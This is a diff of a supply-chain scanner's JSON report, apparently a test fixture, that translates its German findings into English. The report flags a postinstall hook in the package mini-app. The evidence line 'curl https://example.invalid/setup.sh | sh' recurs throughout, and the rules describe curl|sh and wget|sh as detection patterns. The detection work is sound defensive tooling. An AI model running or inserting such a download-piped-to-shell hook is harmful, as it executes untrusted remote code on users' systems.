@@ -1,5 +1,6 @@
 {
-  "lockward_version": "0.1.2",
+  "lockward_version": "0.2.0",
+  "report_version": 2,
   "score_version": "score-v1",
   "heuristics_version": "heuristics-v1.1",
   "scanned_at": "2026-10-12T00:00:00Z",
@@ -9,7 +10,7 @@
   "project_severity": "high",
   "gate": {
     "mode": "warn",
-    "outcome": "Warnung",
+    "outcome": "warn",
     "exit_code": 1
   },
   "packages": [
@@ -24,11 +25,11 @@
       "explanations": [
         {
           "source": "LW-H003",
-          "text": "Paket mini-app@1.0.0 Hook `postinstall`: der Hook spricht mit dem Netzwerk oder lädt Daten herunter. Beleg: `curl https://example.invalid/setup.sh | sh`."
+          "text": "Package mini-app@1.0.0 hook `postinstall` contacts the network or downloads data. Evidence: `curl https://example.invalid/setup.sh | sh`."
         },
         {
           "source": "LW-H004",
-          "text": "Paket mini-app@1.0.0 Hook `postinstall`: der Hook leitet einen Download in eine Shell. Beleg: `curl https://example.invalid/setup.sh | sh`."
+          "text": "Package mini-app@1.0.0 hook `postinstall` pipes a download into a shell. Evidence: `curl https://example.invalid/setup.sh | sh`."
         }
       ]
     }
@@ -40,15 +41,7 @@
       "package_version": "",
       "configured_action": "warn",
       "effective_action": "warn",
-      "message": "1 Pakete nicht gegen OSV geprüft (offline, kein/stale Cache)."
-    },
-    {
-      "rule": "no_outbound_build",
-      "package_name": "mini-app",
-      "package_version": "1.0.0",
-      "configured_action": "fail",
-      "effective_action": "warn",
-      "message": "Hook `postinstall` in mini-app@1.0.0 führt heruntergeladenen Inhalt in einer Shell aus (LW-H004)."
+      "message": "1 package was not checked against OSV (offline, no cache entry or a stale cache)."
     },
     {
       "rule": "no_outbound_build",
@@ -56,11 +49,19 @@
       "package_version": "1.0.0",
       "configured_action": "review",
       "effective_action": "warn",
-      "message": "Hook `postinstall` in mini-app@1.0.0 lädt während der Installation aus dem Netz, ohne den Inhalt auszuführen (LW-H003)."
+      "message": "Package mini-app@1.0.0 hook `postinstall` downloads during install and does not execute the content (LW-H003)."
+    },
+    {
+      "rule": "no_outbound_build",
+      "package_name": "mini-app",
+      "package_version": "1.0.0",
+      "configured_action": "fail",
+      "effective_action": "warn",
+      "message": "Package mini-app@1.0.0 hook `postinstall` pipes downloaded content into a shell (LW-H004)."
     }
   ],
   "notes": [
-    "new_dependencies: keine Baseline übergeben, die Regel ist für diesen Lauf inaktiv."
+    "new_dependencies is inactive for this run because no baseline was passed."
   ],
   "hooks": [
     {
@@ -77,25 +78,25 @@
   "heuristics": [
     {
       "rule_id": "LW-H003",
-      "description": "Netzwerk-Client oder Download-Werkzeug im Hook",
+      "description": "Network client or download tool in an install hook",
       "weight": 15,
       "package_name": "mini-app",
       "package_version": "1.0.0",
       "package_path": "",
       "hook": "postinstall",
       "evidence": "curl https://example.invalid/setup.sh | sh",
-      "explanation": "Paket mini-app@1.0.0 Hook `postinstall`: der Hook spricht mit dem Netzwerk oder lädt Daten herunter. Beleg: `curl https://example.invalid/setup.sh | sh`."
+      "explanation": "Package mini-app@1.0.0 hook `postinstall` contacts the network or downloads data. Evidence: `curl https://example.invalid/setup.sh | sh`."
     },
     {
       "rule_id": "LW-H004",
-      "description": "Download direkt in eine Shell (curl|sh oder wget|sh)",
+      "description": "Download piped into a shell (curl|sh or wget|sh)",
       "weight": 35,
       "package_name": "mini-app",
       "package_version": "1.0.0",
       "package_path": "",
       "hook": "postinstall",
       "evidence": "curl https://example.invalid/setup.sh | sh",
-      "explanation": "Paket mini-app@1.0.0 Hook `postinstall`: der Hook leitet einen Download in eine Shell. Beleg: `curl https://example.invalid/setup.sh | sh`."
+      "explanation": "Package mini-app@1.0.0 hook `postinstall` pipes a download into a shell. Evidence: `curl https://example.invalid/setup.sh | sh`."
     }
   ],
   "advisories": {
